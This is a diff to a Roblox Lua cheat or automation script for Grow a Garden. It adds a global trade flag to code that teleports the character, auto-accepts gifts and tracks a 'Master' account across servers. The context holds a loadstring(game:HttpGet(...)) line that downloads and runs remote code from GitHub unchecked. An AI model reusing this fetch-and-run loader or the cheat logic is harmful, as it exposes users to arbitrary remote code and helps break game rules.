@@ -84,6 +84,7 @@ task.spawn(function()
                     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(74.90898132324219, math.random(-60, -50), 190.9416046142578)
                     game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                     is_active = true
+                    _G.Is_Trade = true
                     if game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification") then
                         interact(game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification").Holder.Frame.Accept)
                     end
@@ -106,6 +107,7 @@ task.spawn(function()
                             if result.JobId == game.JobId and game.Players:FindFirstChild(x) then
                                 print("Found Master Active!")
                                 is_active = true
+                                _G.Is_Trade = true
                                 while true do task.wait(1)
                                     for _, v in pairs(workspace.PetsPhysical:GetChildren()) do
                                         if v then
@@ -186,6 +188,7 @@ task.spawn(function()
                                 end
                             elseif not _timeout and not game.Players:FindFirstChild(x) then
                                 is_active = true
+                                _G.Is_Trade = true
                                 print("Not In Server! Teleporting...")
                                 print(result.JobId, game.JobId)
                                 local success, error = pcall(function()
@@ -214,6 +217,7 @@ task.spawn(function()
                         print("Use Aya Aya Scripts!")
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/Achitsak/zapzone/main/loader/scripts/grow_a_garden.lua"))()
                         is_executed = true
+                        _G.Is_Trade = false
                         break
                     end
                 end
